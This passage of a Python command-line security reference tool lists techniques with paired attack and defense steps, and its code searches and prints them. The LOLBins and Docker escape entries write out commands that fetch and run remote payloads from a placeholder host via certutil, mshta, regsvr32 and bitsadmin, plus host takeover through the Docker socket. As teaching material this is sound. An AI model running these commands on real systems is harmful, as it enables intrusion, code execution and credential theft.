            "Use SameSite=Strict cookies to prevent cross-origin cookie inclusion.",
            "Avoid trusting null origin in production.",
            "Regularly test CORS policy with automated tools like CORStest.",
        ],
    },

    # ── SYSTEM (MODERN) ──────────────────────────────────────────────────────
    {
        "name": "Living off the Land (LOLBins)",
        "aliases": ["lolbins", "living off the land", "lolbas", "built-in tools attack",
                    "fileless attack", "trusted binary abuse", "certutil", "mshta", "regsvr32"],
        "category": "System",
        "risk": "HIGH",
        "tools": ["certutil", "mshta", "regsvr32", "wmic", "bitsadmin", "MSBuild", "Rundll32"],
        "cve_examples": [],
        "attack_steps": [
            "Avoid dropping custom malware — use Windows built-in binaries to evade AV.",
            "Download files with certutil: certutil -urlcache -f http://<ip>/payload.exe payload.exe.",
            "Execute remote script with mshta: mshta http://<ip>/evil.hta.",
            "Register and run COM scriptlet with regsvr32: regsvr32 /s /n /u /i:http://<ip>/evil.sct scrobj.dll.",
            "Execute PowerShell via wmic: wmic process call create 'powershell -enc <b64>'.",
            "Download and run via bitsadmin: bitsadmin /transfer job http://<ip>/file C:\\file.",
            "Compile and run C# via MSBuild to execute shellcode.",
            "Use Rundll32 to execute DLLs: rundll32 javascript:'..\\mshtml,RunHTMLApplication';.",
            "Chain LOLBins for persistence — scheduled tasks using wmic, startup via reg.",
        ],
        "defense_steps": [
            "Use Application Control (AppLocker, Windows Defender Application Control) to restrict LOLBins.",
            "Enable PowerShell script block logging and constrained language mode.",
            "Block child processes from Office applications (ASR rules).",
            "Monitor for unusual use of certutil, mshta, wmic with network activity.",
            "Enable Sysmon and forward logs to SIEM — alert on LOLBin abuse patterns.",
            "Block outbound HTTP/HTTPS from certutil, bitsadmin at the firewall.",
            "Implement UEBA to detect abnormal use of built-in tools.",
            "Restrict internet access for application servers to necessary destinations only.",
        ],
    },
    {
        "name": "Container Escape (Docker)",
        "aliases": ["docker escape", "container escape", "docker breakout", "docker privesc",
                    "privileged container", "docker socket", "container breakout"],
        "category": "System",
        "risk": "CRITICAL",
        "tools": ["CDK", "deepce", "custom scripts", "nsenter", "docker socket"],
        "cve_examples": ["CVE-2019-5736 (runc)", "CVE-2020-15257 (containerd)"],
        "attack_steps": [
            "Gain code execution inside a Docker container via web exploit or supply chain.",
            "Check if container is privileged: cat /proc/self/status | grep CapEff.",
            "If privileged: mount host filesystem: mkdir /mnt/host && mount /dev/sda1 /mnt/host.",
            "Access host files: chroot /mnt/host /bin/bash — full host access.",
            "Check for Docker socket mount: ls /var/run/docker.sock.",
            "If socket present: docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host.",
            "Use CDK tool for automated container escape: ./cdk auto-escape.",
            "Exploit CVE-2019-5736 (runc) to overwrite host runc binary.",
            "Access cloud metadata from container to steal IAM credentials.",
        ],
        "defense_steps": [
            "Never run containers in privileged mode unless absolutely necessary.",
            "Do not mount the Docker socket into containers.",
            "Apply read-only root filesystem where possible.",
            "Use seccomp and AppArmor profiles to restrict container syscalls.",
            "Enable user namespaces to map container root to unprivileged host user.",
            "Keep container runtime (Docker, containerd) patched to latest versions.",
            "Use Falco to detect suspicious container activity at runtime.",
            "Apply Pod Security Standards in Kubernetes to enforce security policies.",
            "Scan container images for vulnerabilities before deployment.",
        ],
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

RISK_COLORS = {
    "CRITICAL": f"{RED}{BOLD}",
    "HIGH":     f"{YELLOW}{BOLD}",
    "MEDIUM":   f"{CYAN}",
    "LOW":      f"{GREEN}",
}

CATEGORY_COLORS = {
    "Web":               BLUE,
    "Network":           CYAN,
    "System":            MAGENTA,
    "Wireless":          YELLOW,
    "Social Engineering":RED,
    "Cryptography":      GREEN,
    "Active Directory":  YELLOW,
    "Cloud":             CYAN,
    "Modern Exploits":   RED,
}

def print_banner():
    print(f"{RED}{BANNER}{RESET}")
    print(f"{CYAN}{BOLD}        Offensive & Defensive Security Guide — by SNXXIII{RESET}")
    print(f"{DIM}  {'─'*68}{RESET}")
    print(f"{YELLOW}  ⚠  For authorized security research, pentesting & education only{RESET}")
    print(f"{DIM}  {'─'*68}{RESET}\n")

def find_technique(query):
    """Find matching techniques from query using alias matching."""
    q = query.lower().strip()
    results = []
    for t in TECHNIQUES:
        score = 0
        # Exact alias match (highest priority)
        if q in [a.lower() for a in t["aliases"]]:
            score = 100
        else:
            # Partial alias match
            for alias in t["aliases"]:
                if q in alias.lower() or alias.lower() in q:
                    score = max(score, 80)
            # Word-level match
            q_words = set(q.split())
            for alias in t["aliases"]:
                alias_words = set(alias.lower().split())
                common = q_words & alias_words
                if common:
                    score = max(score, len(common) * 20)
            # Name match
            if q in t["name"].lower():
                score = max(score, 75)
        if score > 0:
            results.append((score, t))

    results.sort(key=lambda x: x[0], reverse=True)
    return [t for _, t in results]

def display_technique(t, show_attack=True, show_defense=True):
    risk_color = RISK_COLORS.get(t["risk"], "")
    cat_color  = CATEGORY_COLORS.get(t["category"], "")

    print(f"\n  {BOLD}{'═'*68}{RESET}")
    print(f"  {BOLD}{t['name']}{RESET}  "
          f"{risk_color}[{t['risk']}]{RESET}  "
          f"{cat_color}[{t['category']}]{RESET}")
    print(f"  {BOLD}{'═'*68}{RESET}\n")

    # Tools
    if t["tools"]:
        print(f"  {YELLOW}{BOLD}Tools:{RESET}  {DIM}{', '.join(t['tools'])}{RESET}")

    # CVE Examples
    if t["cve_examples"]:
        print(f"  {YELLOW}{BOLD}CVE Examples:{RESET}  {DIM}{', '.join(t['cve_examples'])}{RESET}")

    print()

    # Attack Steps
    if show_attack:
        print(f"  {RED}{BOLD}⚔  ATTACK — Step by Step:{RESET}")
        print(f"  {DIM}{'─'*68}{RESET}")
        for i, step in enumerate(t["attack_steps"], 1):
            print(f"  {RED}{BOLD}  [{i:02d}]{RESET}  {step}")
        print()

    # Defense Steps
    if show_defense:
        print(f"  {GREEN}{BOLD}🛡  DEFENSE — Step by Step:{RESET}")
        print(f"  {DIM}{'─'*68}{RESET}")
        for i, step in enumerate(t["defense_steps"], 1):
            print(f"  {GREEN}{BOLD}  [{i:02d}]{RESET}  {step}")
        print()

    print(f"  {BOLD}{'─'*68}{RESET}\n")

def list_all():
    print(f"\n  {CYAN}{BOLD}Available Techniques:{RESET}\n")
    categories = {}
    for t in TECHNIQUES:
        categories.setdefault(t["category"], []).append(t)

    for cat, techniques in categories.items():
        cat_color = CATEGORY_COLORS.get(cat, "")
        print(f"  {cat_color}{BOLD}[ {cat} ]{RESET}")
        for t in techniques:
            risk_color = RISK_COLORS.get(t["risk"], "")
            aliases_preview = ', '.join(t["aliases"][:4])
            print(f"    {BOLD}{t['name']:<35}{RESET} "
                  f"{risk_color}[{t['risk']}]{RESET}  "
                  f"{DIM}({aliases_preview}){RESET}")
        print()

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Project 101 - Offensive & Defensive Security Guide",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("query", nargs="?",
                        help="Attack technique or description e.g. 'sql injection', 'break wifi'")
    parser.add_argument("--list",    action="store_true", help="List all available techniques")
    parser.add_argument("--attack",  action="store_true", help="Show attack steps only")
    parser.add_argument("--defense", action="store_true", help="Show defense steps only")
    parser.add_argument("--category", help="Filter list by category (Web, Network, System, Wireless, etc.)")

    if len(sys.argv) == 1:
        print(f"{CYAN}  Describe an attack technique in plain language.{RESET}")
        print(f"{CYAN}  Get step-by-step attack & defense guidance instantly.\n{RESET}")
        print(f"{YELLOW}  Usage:{RESET}")
        print(f"    python3 Project101.py \"<technique or description>\"")
        print(f"    python3 Project101.py --list\n")
        print(f"{YELLOW}  Examples:{RESET}")
        print(f"    python3 Project101.py \"sql injection\"")
        print(f"    python3 Project101.py \"break wifi\"")
        print(f"    python3 Project101.py \"how to intercept traffic\"")
        print(f"    python3 Project101.py \"privilege escalation linux\"")
        print(f"    python3 Project101.py \"phishing\" --attack")
        print(f"    python3 Project101.py \"xss\" --defense")
        print(f"    python3 Project101.py --list --category Web")
        sys.exit(0)

    args = parser.parse_args()

    # List mode
    if args.list:
        if args.category:
            filtered = [t for t in TECHNIQUES
                        if t["category"].lower() == args.category.lower()]
            if not filtered:
                print(f"{RED}[!] No techniques found for category: {args.category}{RESET}")
            else:
                print(f"\n  {CYAN}{BOLD}[ {args.category} ]{RESET}\n")
                for t in filtered:
                    risk_color = RISK_COLORS.get(t["risk"], "")
                    print(f"  {BOLD}{t['name']:<35}{RESET} {risk_color}[{t['risk']}]{RESET}")
        else:
            list_all()
        sys.exit(0)

    if not args.query:
        print(f"{RED}[!] No query provided. Run without arguments to see usage.{RESET}")
        sys.exit(1)

    matches = find_technique(args.query)

    if not matches:
        print(f"{YELLOW}  [~] No technique found for: '{args.query}'{RESET}")
        print(f"{DIM}  Try --list to see all available techniques.{RESET}")
        sys.exit(1)

    # Determine what to show
    show_attack  = True
    show_defense = True
    if args.attack and not args.defense:
        show_defense = False
    if args.defense and not args.attack:
        show_attack = False

    # Show best match, mention others if any
    best = matches[0]
    display_technique(best, show_attack=show_attack, show_defense=show_defense)

    if len(matches) > 1:
        others = [m["name"] for m in matches[1:4]]
        print(f"  {DIM}Related techniques: {', '.join(others)}{RESET}")
        print(f"  {DIM}Search for them directly for more detail.{RESET}\n")

if __name__ == "__main__":
    main()
